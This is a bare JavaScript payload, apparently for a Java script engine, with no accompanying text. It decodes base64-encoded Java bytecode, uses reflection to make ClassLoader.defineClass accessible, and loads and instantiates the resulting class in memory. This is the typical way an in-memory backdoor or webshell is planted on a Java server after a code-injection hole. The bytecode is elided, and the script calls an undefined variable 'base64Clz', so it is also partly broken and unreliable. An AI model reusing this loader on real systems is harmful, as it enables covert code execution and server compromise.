var classLoader = java.lang.Thread.currentThread().getContextClassLoader();
try{
    classLoader.loadClass("J411323603280984").newInstance();
}catch (e){
    var clsString = classLoader.loadClass('java.lang.String');
    var bytecodeBase64 = "yv66vgAAADEAcg...";
    var bytecode;
    try{
        var clsBase64 = classLoader.loadClass("java.util.Base64");
        var clsDecoder = classLoader.loadClass("java.util.Base64$Decoder");
        var decoder = clsBase64.getMethod("getDecoder").invoke(base64Clz);
        bytecode = clsDecoder.getMethod("decode", clsString).invoke(decoder, bytecodeBase64);
    } catch (ee) {
        var datatypeConverterClz = classLoader.loadClass("javax.xml.bind.DatatypeConverter");
        bytecode = datatypeConverterClz.getMethod("parseBase64Binary", clsString).invoke(datatypeConverterClz, bytecodeBase64);
    }
    var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');
    var clsByteArray = classLoader.loadClass('[B');
    var clsInt = java.lang.Integer.TYPE;
    var defineClass = clsClassLoader.getDeclaredMethod("defineClass", clsByteArray, clsInt, clsInt);
    defineClass.setAccessible(true);
    var clazz = defineClass.invoke(java.lang.Thread.currentThread().getContextClassLoader(),bytecode,0,bytecode.length);
    clazz.newInstance();
}
